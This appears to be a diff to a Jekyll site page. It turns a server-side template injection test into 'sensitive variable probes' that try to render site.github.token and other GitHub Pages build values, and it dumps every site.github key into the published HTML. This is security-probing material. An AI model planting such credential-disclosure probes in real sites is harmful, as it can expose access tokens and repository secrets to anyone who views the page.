@@ -1,16 +1,17 @@
 ---
 ---
-<!DOCTYPE html>
-<html>
-<body>
-<h1>SSTI Test</h1>
-<p>Math: {{ 7 | times: 7 }}</p>
-<p>Jekyll version: {{ jekyll.version }}</p>
-<p>Jekyll env: {{ jekyll.environment }}</p>
-<p>Site URL: {{ site.url }}</p>
-<p>GitHub API: {{ site.github.api_url }}</p>
-<p>GitHub Hostname: {{ site.github.hostname }}</p>
-<p>GitHub Versions: {{ site.github.versions }}</p>
-<p>GitHub Source: {{ site.github.source }}</p>
-</body>
-</html>
+<!DOCTYPE html><html><body>
+<h2>Sensitive variable probes</h2>
+<p>github.token: {{ site.github.token }}</p>
+<p>github.api_url: {{ site.github.api_url }}</p>
+<p>github.help_url: {{ site.github.help_url }}</p>
+<p>github.environment: {{ site.github.environment }}</p>
+<p>github.build_revision: {{ site.github.build_revision }}</p>
+<p>github.owner_name: {{ site.github.owner_name }}</p>
+<p>github.repository_name: {{ site.github.repository_name }}</p>
+<p>github.zip_url: {{ site.github.zip_url }}</p>
+<p>github.releases_url: {{ site.github.releases_url }}</p>
+<p>github.contributors: {{ site.github.contributors | jsonify }}</p>
+<h2>All site.github keys</h2>
+{% for pair in site.github %}<p>{{ pair[0] }}: {{ pair[1] | truncate: 80 }}</p>{% endfor %}
+</body></html>
